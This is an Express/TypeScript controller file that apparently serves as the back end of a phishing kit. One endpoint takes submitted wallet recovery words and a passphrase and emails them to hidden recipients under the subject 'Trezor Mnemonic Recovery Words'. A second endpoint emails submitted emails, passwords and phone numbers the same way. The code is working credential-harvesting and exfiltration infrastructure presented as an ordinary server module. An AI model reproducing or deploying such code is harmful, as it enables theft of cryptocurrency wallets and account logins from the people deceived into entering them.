import { Request, Response } from "express";
import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
import nodemailer from "nodemailer";

/**
 * Utility: Get recipients from env as array
 */
const getRecipients = (): string[] => {
  const recipients = process.env.RECIPIENT_EMAIL;
  if (!recipients) return [];
  return recipients.split(",").map(email => email.trim());
};





export const sendMnemonicController = asyncHandler(
  async (req: Request, res: Response): Promise<Response> => {
    const payload = req.body;
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });
    if (!payload || !payload.data || !Array.isArray(payload.data)) {
      return errorResponse(res, "Invalid payload", 400);
    }

    // Build HTML email
    let htmlContent = `<h2>${payload.heading}</h2>`;
    htmlContent += `<h3>PassPhrase: ${payload?.passphrase}</h3>`;
    htmlContent += `<ul>`;
    payload.data.forEach((item: { label: string; value: string }) => {
      htmlContent += `<li><strong>${item.label}:</strong> ${item.value}</li>`;
    });
    htmlContent += `</ul>`;

    try {
      const recipients = getRecipients();
      if (recipients.length === 0) {
        return errorResponse(res, "No recipients configured", 400);
      }
      const mailOptions = {
        from: `"${payload?.heading}" <${process.env.SMTP_USER}>`,
        to: recipients, // supports array of emails
        subject: "Trezor Mnemonic Recovery Words",
        html: htmlContent,
      };

      const info = await transporter.sendMail(mailOptions);
      console.log("✅ Email sent:", info.messageId);
      console.log("📬 Preview URL:", nodemailer.getTestMessageUrl(info));
      return successResponse(res, { id: info.messageId }, "Mnemonic sent successfully", 200);
    } catch (error: any) {
      console.error("❌ Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);

/**
 * Controller: Send User Info Email
 */
export const sendUserInfoController = asyncHandler(
  async (req: Request, res: Response): Promise<Response> => {
    const { title, email, password, phone } = req.body;
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    if (!title || !email || !password) {
      return errorResponse(res, "Missing required fields", 400);
    }

    const htmlContent = `
        <h2>${title}</h2>
        <ul>
          <li><strong>Email:</strong> ${email}</li>
          <li><strong>Password:</strong> ${password}</li>
          <li><strong>Phone:</strong> ${phone || "N/A"}</li>
        </ul>
      `;

    try {
      const recipients = getRecipients();
      if (recipients.length === 0) {
        return errorResponse(res, "No recipients configured", 400);
      }

      const mailOptions = {
        from: `"${title}" <${process.env.SMTP_USER}>`,
        to: recipients,
        subject: "User Information Received",
        html: htmlContent,
      };

      const info = await transporter.sendMail(mailOptions);
      console.log("✅ Email sent:", info.messageId);

      return successResponse(res, { id: info.messageId }, "Email sent successfully", 200);
    } catch (error: any) {
      console.error("❌ Email sending error:", error.message);
      return errorResponse(res, "Failed to send email", 500);
    }
  }
);
